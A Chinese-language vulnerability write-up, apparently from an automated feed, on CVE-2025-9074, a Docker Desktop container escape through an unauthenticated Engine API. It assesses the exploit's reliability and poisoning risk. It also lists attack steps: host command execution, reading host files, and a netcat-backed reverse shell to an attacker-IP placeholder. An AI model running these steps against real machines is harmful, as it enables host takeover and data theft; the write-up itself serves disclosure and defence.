## CVE-2025-9074 - Docker Desktop 容器逃逸/未授权访问/越权访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/未授权访问/越权访问

**影响应用:** Docker Desktop

**危害等级:** 高危/Critical

**CVSS评分:** 9.3

**影响版本:** Docker Desktop < 4.44.3

**利用条件:** 本地运行的恶意Linux容器，无需认证，通过默认子网访问Docker Engine API

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

对CVE-2025-9074的POC代码（基于提供的README.md描述）进行投毒风险评估，结果显示其投毒风险较低，约为10%。主要原因如下：
首先，POC的README.md文档非常清晰、透明。它明确指出了漏洞的CVE ID、CVSS评分、受影响版本、攻击平台、修复版本、发现者以及技术细节。这为分析人员提供了充足的上下文信息，降低了隐藏恶意行为的可能性。
其次，POC的使用说明详细列出了所需的Python requests库依赖，这是一个广泛使用的标准HTTP库，本身不含有恶意功能。所演示的攻击方式（命令执行、反向Shell）直接针对漏洞本身，即通过未授权的Docker Engine API访问来突破容器隔离。命令示例（如whoami、cat、ls）和反向Shell的配置都属于漏洞利用的常见手法。
再者，POC明确了攻击目标地址为Docker Desktop内部的API地址192.168.65.7:2375，这表明其意图是与本地的Docker服务交互，而非连接到未知的外部恶意服务器。攻击场景图也清晰地描绘了恶意容器如何通过API访问最终导致主机受控的过程，没有暗示任何额外、无关的恶意网络通信或数据窃取行为。
尽管如此，任何从第三方来源获取的POC代码都存在理论上的投毒风险。即使README看起来无害，实际的exploit.py文件仍可能包含额外的、未声明的恶意负载，例如加密货币挖矿代码、后门植入或信息窃取模块。因此，在实际运行任何POC之前，强烈建议进行彻底的代码审计。然而，基于现有信息，该POC的高度透明度和目标单一性，使得其被用于投毒的风险相对较低。10%的风险评分反映了理论上的可能性，但在没有实际代码审查的情况下，难以完全排除。

**POC有效性分析**
所提供的CVE-2025-9074的Proof of Concept (POC)，在其README.md中详细描述，明确展示了Docker Desktop中一个关键的容器逃逸漏洞。该漏洞允许在运行于受影响Docker Desktop实例上的任何Linux容器中，未经身份验证地访问Docker Engine API。API通过TCP套接字在`http://192.168.65.7:2375`暴露，绕过了标准的隔离机制，包括增强容器隔离 (ECI) 和“在tcp://localhost:2375上不使用TLS暴露守护进程”的设置。该POC概述了两种主要的利用模式：在宿主机上执行任意命令和建立反向Shell。对于Windows用户，该漏洞可导致通过Windows Subsystem for Linux (WSL) 后端实现宿主机的完全控制并获得管理权限。在macOS上，它支持容器操作和潜在的后门植入，尽管由于用户提示可能存在一些限制。README包含清晰的先决条件（Python `requests` 库），两种模式的明确命令行示例，以及一个可视化的攻击场景图。这种详细程度和直接的可利用性证实了POC在演示所述关键漏洞方面的高效性。它强调了恶意容器能够提升权限、挂载宿主机文件系统并执行特权命令的能力，从而完全绕过容器隔离。

**利用步骤**
攻击者利用此漏洞的步骤如下：
1.  **目标识别与前置条件**：确认目标系统运行的是受影响的Docker Desktop版本（低于4.44.3），且操作系统为Windows或macOS。获取对目标Docker Desktop上任意一个Linux容器的访问权限。
2.  **验证API可达性**：在已获得的容器内部，执行 `curl http://192.168.65.7:2375/version` 命令。如果成功返回Docker Engine版本信息，则表明Docker API可被未授权访问，漏洞存在。
3.  **准备利用工具**：在容器内部安装Python `requests` 库：`pip3 install requests`。
4.  **执行任意命令**：
    *   **命令执行模式**：使用 `python3 exploit.py -u http://192.168.65.7:2375 -m cmd -c "your_command_here"` 来在宿主机上执行任意命令，例如 `whoami` 或 `ls -la /hostfs/mnt/c/Users` （Windows路径）。`/hostfs` 路径映射到宿主机文件系统。
    *   **读取宿主机文件**：通过命令执行模式，可以读取宿主机文件，例如 `python3 exploit.py -u http://192.168.65.7:2375 -m cmd -c "cat /hostfs/mnt/c/Users/Administrator/Desktop/root.txt"`。
5.  **获取反向Shell**：
    *   **攻击者监听**：在攻击者的机器上设置一个Netcat监听器：`nc -lvnp 4444`。
    *   **容器内执行**：在受控容器内部执行 `python3 exploit.py -u http://192.168.65.7:2375 -m reverse -l <攻击者IP> -p 4444`。成功后，攻击者的监听器将收到来自宿主机的反向Shell连接。通过这个Shell，攻击者可以进一步操作宿主机，宿主机文件系统可通过 `/hostfs` 访问。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
